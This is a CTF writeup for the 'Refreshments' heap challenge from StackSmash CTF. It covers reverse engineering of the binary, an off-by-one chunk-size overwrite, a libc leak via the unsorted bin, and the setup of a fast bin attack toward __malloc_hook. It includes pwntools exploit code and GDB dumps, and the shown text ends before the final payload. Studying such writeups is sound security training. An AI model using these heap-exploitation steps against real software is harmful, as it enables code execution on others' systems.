---
title: "Refreshments - StackSmash CTF"
category: "pwn"
subcategory: "heap"
type: "writeup"
tags: ["pwn", "heap", "unsorted-bin", "off-by-one", "canary", "pie", "stacksmash-ctf", "ctf-writeup"]
summary: "Linux Exploitation Expert - HackTricks Training"
source:
  name: "CTFtime writeup #40355"
  url: "https://ctftime.org/writeup/40355"
original_source: "https://7rocky.github.io/en/ctf/other/htb-stacksmash-ctf/refreshments/"
ctf:
  name: "StackSmash CTF"
  challenge: "Refreshments"
---

## Metadata

- **CTF:** StackSmash CTF
- **Task:** Refreshments
- **Author team:** ICAI Cyber Team
- **CTFtime:** <https://ctftime.org/writeup/40355>
- **Original writeup:** <https://7rocky.github.io/en/ctf/other/htb-stacksmash-ctf/refreshments/>

---
![Linux Exploitation Expert](https://7rocky.github.io/images/LEE.png)

Linux Exploitation Expert — HackTricks Training

Progress from binary exploitation fundamentals to advanced exploit development in Linux across user space, heap, ARM, kernel, and browser targets.

[View Course](https://hacktricks-training.com/courses/lee/) ×

We are given a 64-bit binary called `refreshments`:

`

```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'./glibc/'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

`

Moreover, we are also given the library Glibc 2.23, and the binary is already patched to use this library and loader:

`

```
    $ ./glibc/ld-linux-x86-64.so.2 ./glibc/libc.so.6
    GNU C Library (GNU libc) stable release version 2.23, by Roland McGrath et al.
    Copyright (C) 2016 Free Software Foundation, Inc.
    This is free software; see the source for copying conditions.
    There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
    PARTICULAR PURPOSE.
    Compiled by GNU CC version 7.5.0.
    Available extensions:
            crypt add-on version 2.1 by Michael Glad and others
            GNU Libidn by Simon Josefsson
            Native POSIX Threads Library by Ulrich Drepper et al
            BIND-8.2.3-T5B
    libc ABIs: UNIQUE IFUNC
    For bug reporting instructions, please see:
    <http://www.gnu.org/software/libc/bugs.html>.
```

`

Curiously, Glibc 2.23 is quite old, so this challenge will probably revisit some old techniques related to heap exploitation.

## Reverse engineering

If we open the binary in IDA, we will see this `main` function:

`

```
    int __fastcall __noreturn main(int argc, const char** argv, const char** envp) {
      unsigned __int64 option; // rax
      char count; // [rsp+7h] [rbp-79h]
      unsigned __int64 free_index; // [rsp+8h] [rbp-78h]
      unsigned __int64 edit_index; // [rsp+8h] [rbp-78h]
      unsigned __int64 view_index; // [rsp+8h] [rbp-78h]
      void* ptr[14]; // [rsp+10h] [rbp-70h] BYREF
    
      ptr[11] = (void*) __readfsqword(0x28u);
      setup(argc, argv, envp);
      banner();
      memset(ptr, 0, 0x50);
      count = 0;
    
      while (1) {
        while (1) {
          printf(aMenu, (unsigned int) count);
          option = read_num();
    
          if (option != 4)
            break;
    
          printf("\nChoose glass: ");
          view_index = read_num();
    
          if (view_index >= count)
            goto LABEL_27;
    
          if (ptr[view_index]) {
            printf("\nGlass content: ");
            write(1, ptr[view_index], 0x58u);
            putchar('\n');
          } else {
            error("Cannot view empty glass!");
          }
        }
    
        if (option > 4)
          goto LABEL_28;
    
        switch (option) {
          case 3uLL:
            printf("\nChoose glass to customize: ");
            edit_index = read_num();
    
            if (edit_index >= count)
              goto LABEL_27;
    
            if (ptr[edit_index]) {
              printf("\nAdd another drink: ");
              read(0, ptr[edit_index], 0x59u);
              putchar('\n');
            } else {
              error("Cannot customize empty glass!");
            }
    
            break;
    
          case 1uLL:
            if (count > 15) {
              error("You cannot take any more glasses!");
              exit(69);
            }
    
            ptr[count] = calloc(1u, 0x58u);
    
            if (ptr[count]) {
              count++;
              printf("\nHere is your refreshing juice!\n\n");
            } else {
              error("Something went wrong with the juice!");
            }
    
            break;
    
          case 2uLL:
            printf("\nChoose glass to empty: ");
            free_index = read_num();
    
            if (free_index >= count) {
    LABEL_27:
              error("This glass is unavailable!");
            } else if (ptr[free_index]) {
              free(ptr[free_index]);
              ptr[free_index] = 0;
              puts("\nGlass is empty now!\n");
            } else {
              error("This glass is already empty!");
            }
    
            break;
    
          default:
    LABEL_28:
            error("Have a great day!\n");
            exit(69);
        }
      }
```

`

The function is short, and it is related to heap exploitation. We have these options in a `switch`-`case` statement:

`

```
    $ ./refreshments
    ⬜⬜⬜🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧⬜⬜⬜
    ⬜⬜⬜🟧⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🟧⬜⬜⬜
    ⬜⬜⬜🟧⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🟧⬜⬜⬜
    ⬜⬜⬜🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧⬜⬜⬜
    ⬜⬜🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧⬜⬜
    ⬜🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧⬜
    🟧🟧🟧⬜🟧⬜🟧⬜🟧⬜🟧⬜⬜⬜🟧⬜⬜⬜🟧
    🟧🟧🟧⬜🟧⬜🟧⬜🟧⬜🟧⬜🟧🟧🟧⬜🟧🟧🟧
    🟧🟧🟧⬜🟧⬜🟧⬜🟧⬜🟧⬜🟧🟧🟧⬜⬜🟧🟧
    🟧⬜🟧⬜🟧⬜🟧⬜🟧⬜🟧⬜🟧🟧🟧⬜🟧🟧🟧
    🟧⬜⬜⬜🟧⬜⬜⬜🟧⬜🟧⬜⬜⬜🟧⬜⬜⬜🟧
    🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧
    🟧⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🟧
    🟧⬜⬜⬛⬛⬜⬜⬜⬜⬜⬜⬜⬜⬜⬛⬛⬜⬜🟧
    🟧⬜⬛⬜⬛⬛⬜⬜⬜⬜⬜⬜⬜⬛⬜⬛⬛⬜🟧
    🟧⬜⬛⬛⬛⬛⬜⬜⬜⬜⬜⬜⬜⬛⬛⬛⬛⬜🟧
    🟧⬜🏻⬛⬛⬜⬜⬛⬜⬜⬜⬛⬜⬜⬛⬛🏻⬜🟧
    🟧⬜🏻🏻⬜⬜⬜⬜⬛⬛⬛⬜⬜⬜⬜🏻🏻⬜🟧
    🟧⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🟧
    🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧🟧
    
    It's too hot.. Drink a juice Jumpio.. Or 2.. Or 10!
    
    Menu: 
    
    ███████████████████████████
    █                         █
    █ 1. Fill  glass (0 / 10) █
    █ 2. Empty glass          █
    █ 3. Edit  glass          █
    █ 4. View  glass          █
    █ 5. Exit                 █
    █                         █
    ███████████████████████████
    
    >> 
```

`

Essentially: create, delete, edit and read.

### Create function

This is the routine that creates chunks:

`

```
          case 1uLL:
            if (count > 15) {
              error("You cannot take any more glasses!");
              exit(69);
            }
    
            ptr[count] = calloc(1u, 0x58u);
    
            if (ptr[count]) {
              count++;
              printf("\nHere is your refreshing juice!\n\n");
            } else {
              error("Something went wrong with the juice!");
            }
```

`

Not much to say about this. It creates a `0x61`-sized chunk (`0x58` gets rounded to `0x60`, and the `1` is the `PREV_INUSE` flag). Notice that the program uses `calloc`, so it will erase the chunk’s content before returning the control to the user. After that, the reference is added to a list called `ptr`, which is an array allocated on the stack:

`

```
    int __fastcall __noreturn main(int argc, const char** argv, const char** envp) {
      unsigned __int64 option; // rax
      char count; // [rsp+7h] [rbp-79h]
      unsigned __int64 free_index; // [rsp+8h] [rbp-78h]
      unsigned __int64 edit_index; // [rsp+8h] [rbp-78h]
      unsigned __int64 view_index; // [rsp+8h] [rbp-78h]
      void* ptr[14]; // [rsp+10h] [rbp-70h] BYREF
    
      ptr[11] = (void*) __readfsqword(0x28u);
      setup(argc, argv, envp);
      banner();
      memset(ptr, 0, 0x50);
      count = 0;
    
      // ...
    }
```

`

Curiously, the canary is set on `ptr[11]`, and `memset` only erases 10 slots of `ptr` (`0x50` bytes).

Also, it is strange that the program allocates `ptr[14]` (that is from index `0` to `13`), but `count` can go until 15, so we can use index `14`, which is out of bounds. This might be promising to modify values such as the return address from `main`; however there is no way to return from `main`, since it calls `exit(69)`.

### Delete function

The following code allows us to free chunks:

`

```
          case 2uLL:
            printf("\nChoose glass to empty: ");
            free_index = read_num();
    
            if (free_index >= count) {
    LABEL_27:
              error("This glass is unavailable!");
            } else if (ptr[free_index]) {
              free(ptr[free_index]);
              ptr[free_index] = 0;
              puts("\nGlass is empty now!\n");
            } else {
              error("This glass is already empty!");
            }
```

`

As can be seen, it requests the index of the chunk to delete, and ensures the index is lower than `count` and the corresponding slot is non-empty. After that, it calls `free` and removes the reference from `ptr`.

### Edit function

This is how we can edit chunks:

`

```
          case 3uLL:
            printf("\nChoose glass to customize: ");
            edit_index = read_num();
    
            if (edit_index >= count)
              goto LABEL_27;
    
            if (ptr[edit_index]) {
              printf("\nAdd another drink: ");
              read(0, ptr[edit_index], 0x59u);
              putchar('\n');
            } else {
              error("Cannot customize empty glass!");
            }
```

`

Same as before, the program requests an index, and after some validations, it allows us to enter `0x59` bytes on the selected heap chunk.

Here, we have a one-byte overflow (off-by-one) because we are dealing with `0x61`-sized chunks, whose usable size is `0x58`. As a result, we can fill up the hole chunk and we could add another byte outside the chunk, which might modify the adjacent chunk.

### Show function

Last but not least, we have this routine to read the contents of a chosen chunk:

`

```
          if (option != 4)
            break;
    
          printf("\nChoose glass: ");
          view_index = read_num();
    
          if (view_index >= count)
            goto LABEL_27;
    
          if (ptr[view_index]) {
            printf("\nGlass content: ");
            write(1, ptr[view_index], 0x58u);
            putchar('\n');
          } else {
            error("Cannot view empty glass!");
          }
```

`

As can be seen, the way to print contents is with `write` and a fixed size of `0x58`, so it will print exactly `0x58` bytes, no matter if the chunk contains null bytes.

## Exploit stategy

When I solved this challenge, I didn’t take a clear strategy. However, let’s summarize some ideas:

  * We are limited to use `calloc(1, 0x58)`, which means we have no control over the chunks size, and also that there won’t be uninitialized values on heap chunks
  * We have an off-by-one vulnerability in the edit routine. This allows us to modify the next chunk’s size to something different from `0x61`
  * Freed chunks will go to the Fast Bin, which means we can probably perform a Fast Bin attack to obtain an arbitrary write primitive
  * If we set the next chunk’s size to something like `0xc1` (`2 * 0x60`) and free the corrupted chunk, it will go to the Unsorted Bin, which will hold Glibc pointers to `main_arena`. This might be useful to leak memory addresses


First, I solved this challenge under Ubuntu 24.04, which has a wider range for Glibc and PIE/heap addresses (from `0x70**********` to `0x7f**********` and from `0x55**********` to `0x65**********`, respectively). However, when I tried it remotely, my exploit didn’t work because it relied on the previous address ranges. It looks like the remote binary was running in a different environment, where Glibc addresses PIE/heap addresses range from `0x7e**********` to `0x7f**********` and from `0x55**********` to `0x56**********`, respectively. I will show both approaches for completeness.

## Exploit development

Let’s use the following helper functions:

`

```
    def create(option = b'1\n'):
        io.sendafter(b'>> ', option)
    
    
    def delete(index: int):
        io.sendlineafter(b'>> ', b'2')
        io.sendlineafter(b'Choose glass to empty: ', str(index).encode())
    
    
    def edit(index: int, data: bytes):
        io.sendlineafter(b'>> ', b'3')
        io.sendlineafter(b'Choose glass to customize: ', str(index).encode())
        io.sendafter(b'Add another drink: ', data)
    
    
    def show(index: int) -> bytes:
        io.sendlineafter(b'>> ', b'4')
        io.sendlineafter(b'Choose glass: ', str(index).encode())
        io.recvuntil(b'Glass content: ')
        return io.recvuntil(b'\nMenu:', drop=True)
```

`

### Leaking memory addresses

First of all, we need to leak memory addresses. Typically, we would allocate and free, so that memory addresses are written to the `fd` and `bk` pointers of freed chunks. Then, allocating again we can ususually write a single byte and leak upper bytes of an address. However, `calloc` erases the chunk before writing user-controlled data, which means we can’t use this approach.

Using the off-by-one, we can modify the next chunk’s size. We are interested in freeing a chunk that is larger and overlaps with other chunks. For instance, we can overwrite the size with `0xc1`. If we free this artificial `0xc1`-sized chunk, it will go to the Unsorted Bin.

Let’s implement until the off-by-one:

`

```
    create()  # 0
    create()  # 1
    create()  # 2
    create()  # 3
    
    edit(0, b'\0' * 0x58 + b'\xc1')
```

`

We will see the following in GDB:

`

```
    gef> visual-heap -n
    [+] No tcache in this version of libc
    0x6229503cb000|+0x00000|+0x00000: 0x0000000000000000 0x0000000000000061 | ........a....... |
    0x6229503cb010|+0x00010|+0x00010: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb020|+0x00020|+0x00020: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb030|+0x00030|+0x00030: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb040|+0x00040|+0x00040: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb050|+0x00050|+0x00050: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb060|+0x00000|+0x00060: 0x0000000000000000 0x00000000000000c1 | ................ |
    0x6229503cb070|+0x00010|+0x00070: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb080|+0x00020|+0x00080: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb090|+0x00030|+0x00090: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb0a0|+0x00040|+0x000a0: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb0b0|+0x00050|+0x000b0: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb0c0|+0x00060|+0x000c0: 0x0000000000000000 0x0000000000000061 | ........a....... |
    0x6229503cb0d0|+0x00070|+0x000d0: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb0e0|+0x00080|+0x000e0: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb0f0|+0x00090|+0x000f0: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb100|+0x000a0|+0x00100: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb110|+0x000b0|+0x00110: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb120|+0x00000|+0x00120: 0x0000000000000000 0x0000000000000061 | ........a....... |
    0x6229503cb130|+0x00010|+0x00130: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb140|+0x00020|+0x00140: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb150|+0x00030|+0x00150: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb160|+0x00040|+0x00160: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb170|+0x00050|+0x00170: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb180|+0x00000|+0x00180: 0x0000000000000000 0x0000000000020e81 | ................ |  <-  top
    0x6229503cb190|+0x00010|+0x00190: 0x0000000000000000 0x0000000000000000 | ................ |
    * 8422 lines, 0x20e60 bytes
```

`

As can be seen, GDB interprets the heap layout as if we had 3 chunks: `0x61`, `0xc1` and `0x61`, although we have 4 references:

`

```
    gef> frame 2
    #2  0x0000622929a9c55e in main ()
    gef> stack
    ------------------------------------------------ Stack top (lower address) ------------------------------------------------
    0x7ffeb787eaf0|+0x0000|+000: 0x0400000000000001
    0x7ffeb787eaf8|+0x0008|+001: 0x0000000000000000
    0x7ffeb787eb00|+0x0010|+002: 0x00006229503cb010  ->  0x0000000000000000
    0x7ffeb787eb08|+0x0018|+003: 0x00006229503cb070  ->  0x0000000000000000
    0x7ffeb787eb10|+0x0020|+004: 0x00006229503cb0d0  ->  0x0000000000000000
    0x7ffeb787eb18|+0x0028|+005: 0x00006229503cb130  ->  0x0000000000000000
    0x7ffeb787eb20|+0x0030|+006: 0x0000000000000000
    0x7ffeb787eb28|+0x0038|+007: 0x0000000000000000
    0x7ffeb787eb30|+0x0040|+008: 0x0000000000000000
    0x7ffeb787eb38|+0x0048|+009: 0x0000000000000000
    0x7ffeb787eb40|+0x0050|+010: 0x0000000000000000
    0x7ffeb787eb48|+0x0058|+011: 0x0000000000000000
    0x7ffeb787eb50|+0x0060|+012: 0x0000622929a9c7e0 <__libc_csu_init>  ->  0x8d4c5741fa1e0ff3
    0x7ffeb787eb58|+0x0068|+013: 0x64fc66c8ed3ebf00  <-  canary
    0x7ffeb787eb60|+0x0070|+014: 0x00007ffeb787ec50  ->  0x0000000000000001  <-  $r13
    0x7ffeb787eb68|+0x0078|+015: 0x0000000000000000
    0x7ffeb787eb70|+0x0080|+016: 0x0000622929a9c7e0 <__libc_csu_init>  ->  0x8d4c5741fa1e0ff3
    0x7ffeb787eb78|+0x0088|+017: 0x000077e9d0a2074a <__libc_start_main+0xea>  ->  0x48000153cfe8c789  <-  retaddr[3] ($savedip)
    ---------------------------------------------- Stack bottom (higher address) ----------------------------------------------
```

`

Now, let’s free the `0xc1`-sized chunk:

`

```
    delete(1)
```

`

So, we have this heap layout:

`

```
    gef> visual-heap -n
    [+] No tcache in this version of libc
    0x6229503cb000|+0x00000|+0x00000: 0x0000000000000000 0x0000000000000061 | ........a....... |
    0x6229503cb010|+0x00010|+0x00010: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb020|+0x00020|+0x00020: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb030|+0x00030|+0x00030: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb040|+0x00040|+0x00040: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb050|+0x00050|+0x00050: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb060|+0x00000|+0x00060: 0x0000000000000000 0x00000000000000c1 | ................ |  <-  unsortedbins[1/1]
    0x6229503cb070|+0x00010|+0x00070: 0x000077e9d0d99b78 0x000077e9d0d99b78 | x....w..x....w.. |
    0x6229503cb080|+0x00020|+0x00080: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb090|+0x00030|+0x00090: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb0a0|+0x00040|+0x000a0: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb0b0|+0x00050|+0x000b0: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb0c0|+0x00060|+0x000c0: 0x0000000000000000 0x0000000000000061 | ........a....... |
    0x6229503cb0d0|+0x00070|+0x000d0: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb0e0|+0x00080|+0x000e0: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb0f0|+0x00090|+0x000f0: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb100|+0x000a0|+0x00100: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb110|+0x000b0|+0x00110: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb120|+0x00000|+0x00120: 0x00000000000000c0 0x0000000000000060 | ........`....... |
    0x6229503cb130|+0x00010|+0x00130: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb140|+0x00020|+0x00140: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb150|+0x00030|+0x00150: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb160|+0x00040|+0x00160: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb170|+0x00050|+0x00170: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb180|+0x00000|+0x00180: 0x0000000000000000 0x0000000000020e81 | ................ |  <-  top
    0x6229503cb190|+0x00010|+0x00190: 0x0000000000000000 0x0000000000000000 | ................ |
    * 8422 lines, 0x20e60 bytes
    gef> bins
    ------------------------------------------------------------ Fast Bins for arena 'main_arena' ------------------------------------------------------------
    [+] Found 0 valid chunks in fastbins
    ----------------------------------------------------------- Unsorted Bin for arena 'main_arena' -----------------------------------------------------------
    [+] No tcache in this version of libc
    unsorted_bin[idx=0, size=any, @0x77e9d0d99b88]: fd=0x6229503cb060, bk=0x77e9d0d99b78
     -> Chunk(base=0x6229503cb060, addr=0x6229503cb070, size=0xc0, flags=PREV_INUSE, fd=0x77e9d0d99b78 <main_arena+0x58>, bk=0x77e9d0d99b78 <main_arena+0x58>)
    [+] Found 1 valid chunks in unsorted bin (when traced from `bk`)
    ------------------------------------------------------------ Small Bins for arena 'main_arena' ------------------------------------------------------------
    [+] Found 0 valid chunks in 0 small bins (when traced from `bk`)
    ------------------------------------------------------------ Large Bins for arena 'main_arena' ------------------------------------------------------------
    [+] Found 0 valid chunks in 0 large bins (when traced from `bk`)
```

`

As expected, there is an Unsorted Bin chunk that holds pointers to an offset of `main_arena`:

`

```
    gef> x/gx 0x000077e9d0d99b78
    0x77e9d0d99b78 <main_arena+88>: 0x00006229503cb180
```

`

We cannot use the show routine to get the memory leak, and we cannot allocate in place because `calloc` will erase it. However, we can create another chunk, which will take memory from the Unsorted Bin chunk, and it will update `fd` and `bk` pointers on the remaining memory:

`

```
    create()  # 4
```

`

This is what happens on the heap:

`

```
    gef> visual-heap -n
    [+] No tcache in this version of libc
    0x6229503cb000|+0x00000|+0x00000: 0x0000000000000000 0x0000000000000061 | ........a....... |
    0x6229503cb010|+0x00010|+0x00010: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb020|+0x00020|+0x00020: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb030|+0x00030|+0x00030: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb040|+0x00040|+0x00040: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb050|+0x00050|+0x00050: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb060|+0x00000|+0x00060: 0x0000000000000000 0x0000000000000061 | ........a....... |
    0x6229503cb070|+0x00010|+0x00070: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb080|+0x00020|+0x00080: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb090|+0x00030|+0x00090: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb0a0|+0x00040|+0x000a0: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb0b0|+0x00050|+0x000b0: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb0c0|+0x00060|+0x000c0: 0x0000000000000000 0x0000000000000061 | ........a....... |  <-  unsortedbins[1/1]
    0x6229503cb0d0|+0x00070|+0x000d0: 0x000077e9d0d99b78 0x000077e9d0d99b78 | x....w..x....w.. |
    0x6229503cb0e0|+0x00080|+0x000e0: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb0f0|+0x00090|+0x000f0: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb100|+0x000a0|+0x00100: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb110|+0x000b0|+0x00110: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb120|+0x00000|+0x00120: 0x0000000000000060 0x0000000000000060 | `.......`....... |
    0x6229503cb130|+0x00010|+0x00130: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb140|+0x00020|+0x00140: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb150|+0x00030|+0x00150: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb160|+0x00040|+0x00160: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb170|+0x00050|+0x00170: 0x0000000000000000 0x0000000000000000 | ................ |
    0x6229503cb180|+0x00000|+0x00180: 0x0000000000000000 0x0000000000020e81 | ................ |  <-  top
    0x6229503cb190|+0x00010|+0x00190: 0x0000000000000000 0x0000000000000000 | ................ |
    * 8422 lines, 0x20e60 bytes
    gef> frame 2
    #2  0x0000622929a9c55e in main ()
    gef> stack
    ------------------------------------------------ Stack top (lower address) ------------------------------------------------
    0x7ffeb787eaf0|+0x0000|+000: 0x0400000000000001
    0x7ffeb787eaf8|+0x0008|+001: 0x0000000000000000
    0x7ffeb787eb00|+0x0010|+002: 0x00006229503cb010  ->  0x0000000000000000
    0x7ffeb787eb08|+0x0018|+003: 0x0000000000000000
    0x7ffeb787eb10|+0x0020|+004: 0x00006229503cb0d0  ->  0x00007679eb199b78 <main_arena+0x58>  ->  0x00006229503cb180  ->  ...
    0x7ffeb787eb18|+0x0028|+005: 0x00006229503cb130  ->  0x0000000000000000
    0x7ffeb787eb20|+0x0030|+006: 0x00006229503cb070  ->  0x0000000000000000
    0x7ffeb787eb28|+0x0038|+007: 0x0000000000000000
    0x7ffeb787eb30|+0x0040|+008: 0x0000000000000000
    0x7ffeb787eb38|+0x0048|+009: 0x0000000000000000
    0x7ffeb787eb40|+0x0050|+010: 0x0000000000000000
    0x7ffeb787eb48|+0x0058|+011: 0x0000000000000000
    0x7ffeb787eb50|+0x0060|+012: 0x0000622929a9c7e0 <__libc_csu_init>  ->  0x8d4c5741fa1e0ff3
    0x7ffeb787eb58|+0x0068|+013: 0x64fc66c8ed3ebf00  <-  canary
    0x7ffeb787eb60|+0x0070|+014: 0x00007ffeb787ec50  ->  0x0000000000000001  <-  $r13
    0x7ffeb787eb68|+0x0078|+015: 0x0000000000000000
    0x7ffeb787eb70|+0x0080|+016: 0x0000622929a9c7e0 <__libc_csu_init>  ->  0x8d4c5741fa1e0ff3
    0x7ffeb787eb78|+0x0088|+017: 0x000077e9d0a2074a <__libc_start_main+0xea>  ->  0x48000153cfe8c789  <-  retaddr[3] ($savedip)
    ---------------------------------------------- Stack bottom (higher address) ----------------------------------------------
```

`

Notice how `ptr` holds a pointer to the third chunk, which was overlapped with the fake `0xc1`-sized chunk and now holds Glibc pointers because of the use of an Unsorted Bin. As a result, we can read it with the show routine:

`

```
    glibc.address = u64(show(2)[:8]) - glibc.sym.main_arena - 88
    io.success(f'Glibc base address: {hex(glibc.address)}')
```

`

Moreover, this chunk is already freed, which allows us to run delete, edit and show routines even if the chunk is free (Use After Free):

`

```
    gef> bins
    ------------------------------------------------------------ Fast Bins for arena 'main_arena' ------------------------------------------------------------
    [+] Found 0 valid chunks in fastbins
    ----------------------------------------------------------- Unsorted Bin for arena 'main_arena' -----------------------------------------------------------
    [+] No tcache in this version of libc
    unsorted_bin[idx=0, size=any, @0x77e9d0d99b88]: fd=0x6229503cb0c0, bk=0x77e9d0d99b78
     -> Chunk(base=0x6229503cb0c0, addr=0x6229503cb0d0, size=0x60, flags=PREV_INUSE, fd=0x77e9d0d99b78 <main_arena+0x58>, bk=0x77e9d0d99b78 <main_arena+0x58>)
    [+] Found 1 valid chunks in unsorted bin (when traced from `bk`)
    ------------------------------------------------------------ Small Bins for arena 'main_arena' ------------------------------------------------------------
    [+] Found 0 valid chunks in 0 small bins (when traced from `bk`)
    ------------------------------------------------------------ Large Bins for arena 'main_arena' ------------------------------------------------------------
    [+] Found 0 valid chunks in 0 large bins (when traced from `bk`)
```

`

So, with this we can reliably leak Glibc. We could also leak heap addresses by using another Unsorted Bin chunk and a similar strategy. This will make `fd` and `bk` pointers to point between them, so there will be a heap pointer there too. However, heap leaks are not needed for this exploit.

Before continuing, let’s create another chunk to get rid of the Unsorted Bin and delete it to keep it as a Fast Bin:

`

```
    create()  # 5
    delete(2)
```

`

### Fast Bin attack

Now that we have leaked Glibc and have a Use After Free (UAF), we can easily perform a Fast Bin attack. For those familiar with modern Glibc heap exploitation, the Fast Bin attack is very similar to Tcache poisoning, though the latter is simpler because of having less security checks.

Basically, a Fast Bin attack consists on modifying the `fd` pointer of a freed Fast Bin chunk, so that the singly-linked list is corrupted and when allocating more chunks, eventually a chunk is allocated at a controlled position. This gives us a write primitive.

The main limitation of with Fast Bin attack is to find a place to allocate a chunk, since it must have a chunk shape. In this challenge we are dealing with `0x61`-sized chunks, so if we perform a Fast Bin attack, we need to ensure that the place where we want the chunk to be allocated holds a size field of `0x61` (or others like `0x60` or `0x6f`, among others).

A typical target for a Fast Bin attack is above `__malloc_hook`, since there are some Glibc addresses that usually start with `0x7f`, and this serves as a size for `0x71`-sized chunks, as explained in [Introduction To GLIBC Heap Exploitation - Max Kamper](https://www.youtube.com/watch?v=6-Et7M7qJJg). However, we don’t control the size of allocated chunks, so this is not possible this time.

Some time ago, I solved a challenge called [Dragon Army](https://7rocky.github.io/en/ctf/htb-challenges/pwn/dragon-army) that precisely blocked the use of `0x71`-sized Fast Bin chunks, so I took another approach that relied on the fact that PIE/heap addresses start with `0x55` or `0x56`. In the second case, it can be used as a size for a Fast Bin attack. The thing is that we can target a pointer on `main_arena` (where pointers to the actual heap are stored) and modify the top chunk’s address in the [`malloc_state`](https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L1686) structure:

`

```
    struct malloc_state {
      mutex_t mutex;
      int flags;
      mfastbinptr fastbinsY[NFASTBINS];
      mchunkptr top;
      mchunkptr last_remainder;
      mchunkptr bins[NBINS * 2 - 2];
      unsigned int binmap[BINMAPSIZE];
      struct malloc_state *next;
      struct malloc_state *next_free;
      INTERNAL_SIZE_T attached_threads;
      INTERNAL_SIZE_T system_mem;
      INTERNAL_SIZE_T max_system_mem;
    };
```

`

When modifying the top chunk’s address correctly, we can start allocating above `__malloc_hook` and eventually add a [`one_gadget`](https://github.com/david942j/one_gadget) shell here to get arbitrary code execution.

### Local exploit (Ubuntu 24.04)

Let’s use the same approach as in [Dragon Army](https://7rocky.github.io/en/ctf/htb-challenges/pwn/dragon-army). For this, let’s analyze `main_arena`:

`

```
    gef> x/20gx &main_arena
    0x708552d99b20 <main_arena>:    0x0000000000000000      0x0000000000000000
    0x708552d99b30 <main_arena+16>: 0x0000000000000000      0x0000000000000000
    0x708552d99b40 <main_arena+32>: 0x0000000000000000      0x0000563cc1b900c0
    0x708552d99b50 <main_arena+48>: 0x0000000000000000      0x0000000000000000
    0x708552d99b60 <main_arena+64>: 0x0000000000000000      0x0000000000000000
